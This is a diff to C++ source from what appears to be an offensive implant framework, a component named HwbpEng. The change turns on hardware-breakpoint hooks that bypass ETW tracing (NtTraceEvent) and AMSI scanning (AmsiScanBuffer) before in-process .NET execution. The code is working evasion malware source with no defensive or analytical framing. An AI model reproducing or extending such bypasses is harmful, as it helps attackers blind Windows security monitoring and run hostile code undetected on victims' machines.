@@ -407,14 +407,19 @@ auto DECLFN HwbpEng::NtCreateThreadExHkThunk(
 auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
     if( !Init() ) return FALSE;
 
+    BOOL Success = FALSE;
+
     if ( this->DotnetBypass ) {
 
-        // if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
-        //     if ( !this->Etw.NtTraceEvent ) {
-        //         this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
-        //         KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
-        //     }
-        // }
+        if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
+            if ( !this->Etw.NtTraceEvent ) {
+                this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
+                KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
+            }
+
+            Success = this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
+            if ( ! Success ) return Success;
+        }
 
         if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
             if ( !this->Amsi.Handle ) {
@@ -424,12 +429,14 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
                     this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
                     KhDbg("AmsiScanBuffer %p %X", this->Amsi.AmsiScanBuffer, this->Amsi.AmsiScanBuffer );
                 }
+
+                Success = this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
+                if ( ! Success ) return Success;
             }
         }
     }
 
-    // this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
-    return this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
+    return Success;
 }
 
 auto DECLFN HwbpEng::DotnetExit( VOID ) -> BOOL {
